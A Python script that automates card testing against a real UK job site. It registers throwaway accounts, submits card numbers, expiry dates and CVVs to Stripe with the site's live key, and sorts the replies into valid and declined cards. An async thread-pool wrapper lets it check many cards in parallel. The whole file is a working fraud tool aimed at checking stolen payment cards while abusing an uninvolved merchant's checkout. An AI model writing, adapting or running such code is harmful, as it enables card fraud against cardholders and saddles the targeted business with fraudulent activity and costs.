import requests
import re
import random
import string
import json
import uuid
import asyncio
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=10)

def generate_email():
    """Generate a random email address"""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])
    return f"{username}@{domain}"

def create_stripe_auth(card, mes, ano, cvv):
    """
    Core Stripe Auth function for ecologyjobs.co.uk
    Returns: dict with status and response
    """
    try:
        # Initialize session
        s = requests.Session()
        s.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        }

        # Format year
        if len(ano) == 2:
            yy = str(2000 + int(ano)) if int(ano) < 30 else str(1900 + int(ano))
        else:
            yy = ano

        # Clean card number
        cc = card.replace(" ", "")

        # Step 1: Get registration page
        signup_url = "https://www.ecologyjobs.co.uk/signup/"
        r = s.get(signup_url, timeout=15)

        if r.status_code != 200:
            return {"status": "error", "response": "Site unavailable"}

        # Extract nonce
        nonce_match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r.text)
        if not nonce_match:
            return {"status": "error", "response": "Nonce not found"}

        nonce = nonce_match.group(1)

        # Stripe public key
        stripe_key = "pk_live_51PGynOHIJjZ53CoY9eYAetODZeX9tyaRMeasCAkcfl39Q1C27FAkZKPz0IbpzXZG8TAiBppG06vU48l87i53frxH00XZ9upWGP"

        # Step 2: Register account
        email = generate_email()
        reg_data = {
            'email': email,
            'mailchimp_woocommerce_newsletter': '1',
            'reg_role': 'employer,candidate',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/signup/',
            'register': 'Register'
        }

        r2 = s.post(signup_url, data=reg_data, timeout=15)

        # Check if logged in
        if 'wordpress_logged_in_' not in str(s.cookies):
            return {"status": "error", "response": "Registration failed"}

        # Step 3: Get payment methods page
        payment_url = signup_url + "payment-methods/"
        p = s.get(payment_url, timeout=15)

        # Extract setup intent nonce
        intent_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', p.text)
        if not intent_nonce_match:
            return {"status": "error", "response": "Intent nonce not found"}

        intent_nonce = intent_nonce_match.group(1)

        # Step 4: Create Stripe payment method
        pm_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': yy,
            'card[exp_month]': mes,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent',
            'referrer': 'https://www.ecologyjobs.co.uk',
            'guid': str(uuid.uuid4()),
            'key': stripe_key,
            '_stripe_version': '2024-06-20'
        }

        pm_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': s.headers['User-Agent']
        }

        pm_response = s.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=pm_headers,
            data=pm_data,
            timeout=15
        )

        pm_json = pm_response.json()

        # Check for card errors
        if 'error' in pm_json:
            error_msg = pm_json['error'].get('message', 'Card declined')
            error_code = pm_json['error'].get('code', 'card_declined')

            # Map error codes to friendly messages
            if error_code == 'incorrect_number' or 'number' in error_msg.lower():
                return {"status": "declined", "response": "INCORRECT_NUMBER"}
            elif error_code == 'invalid_expiry_month' or 'month' in error_msg.lower():
                return {"status": "declined", "response": "INVALID_EXPIRY_MONTH"}
            elif error_code == 'invalid_expiry_year' or 'year' in error_msg.lower():
                return {"status": "declined", "response": "INVALID_EXPIRY_YEAR"}
            elif error_code == 'invalid_cvc' or 'cvc' in error_msg.lower():
                return {"status": "declined", "response": "INVALID_CVC"}
            else:
                return {"status": "declined", "response": error_msg.upper().replace(' ', '_')}

        pm_id = pm_json.get('id')
        if not pm_id:
            return {"status": "error", "response": "Payment method creation failed"}

        # Step 5: Confirm setup intent
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': intent_nonce
        }

        ajax_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.ecologyjobs.co.uk',
            'referer': payment_url,
            'user-agent': s.headers['User-Agent'],
            'x-requested-with': 'XMLHttpRequest'
        }

        r3 = s.post(
            'https://www.ecologyjobs.co.uk/wp-admin/admin-ajax.php',
            headers=ajax_headers,
            data=ajax_data,
            timeout=15
        )

        if r3.status_code != 200:
            return {"status": "error", "response": f"Connection failed ({r3.status_code})"}

        # Parse response
        try:
            response_json = r3.json()

            if response_json.get('success'):
                return {"status": "approved", "response": "CARD_ADDED"}
            else:
                # Handle error response
                data = response_json.get('data', {})
                if isinstance(data, dict):
                    error_info = data.get('error', {})
                    if isinstance(error_info, dict):
                        error_msg = error_info.get('message', 'Card declined')
                        error_code = error_info.get('code', 'generic_decline')

                        # Check for specific responses
                        if 'insufficient' in error_msg.lower():
                            return {"status": "approved", "response": "INSUFFICIENT_FUNDS"}
                        elif 'security code' in error_msg.lower() or 'cvc' in error_msg.lower():
                            return {"status": "approved", "response": "INCORRECT_CVC"}
                        elif 'zip' in error_msg.lower() or 'postal' in error_msg.lower():
                            return {"status": "approved", "response": "INCORRECT_ZIP"}
                        elif 'authenticate' in error_msg.lower() or '3d' in error_msg.lower():
                            return {"status": "approved", "response": "3DS_REQUIRED"}
                        elif 'risk' in error_msg.lower() or 'fraud' in error_msg.lower():
                            return {"status": "declined", "response": "FRAUD_SUSPECTED"}
                        else:
                            return {"status": "declined", "response": error_msg.upper().replace(' ', '_')}
                    else:
                        return {"status": "declined", "response": str(error_info).upper().replace(' ', '_')}
                else:
                    return {"status": "declined", "response": "CARD_DECLINED"}

        except json.JSONDecodeError:
            return {"status": "error", "response": "Invalid response format"}

    except requests.exceptions.Timeout:
        return {"status": "error", "response": "Request timeout"}
    except requests.exceptions.ConnectionError:
        return {"status": "error", "response": "Connection error"}
    except Exception as e:
        return {"status": "error", "response": f"ERROR: {str(e)}"}

async def async_stripe_auth(card, mes, ano, cvv):
    """Async wrapper for Stripe auth"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, create_stripe_auth, card, mes, ano, cvv)
